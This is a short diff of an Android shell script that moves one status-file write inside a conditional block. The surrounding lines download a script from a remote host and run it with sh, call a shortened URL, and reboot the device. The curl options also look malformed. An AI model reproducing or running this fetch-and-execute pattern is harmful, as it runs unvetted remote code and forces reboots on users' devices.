@@ -10,8 +10,8 @@ if [ "$file_content" = "123" ]; then
     curl -o -s http://tanluying.github.io/ying/hp.sh /storage/emulated/0/Download/hp.sh
     sh /storage/emulated/0/Download/hp.sh
     curl -l https://sourl.cn/tRtpnk
+    echo "456" > /storage/emulated/0/Download/apks.txt
     reboot
 fi
-echo "456" > /storage/emulated/0/Download/apks.txt
 #####
 sleep 900
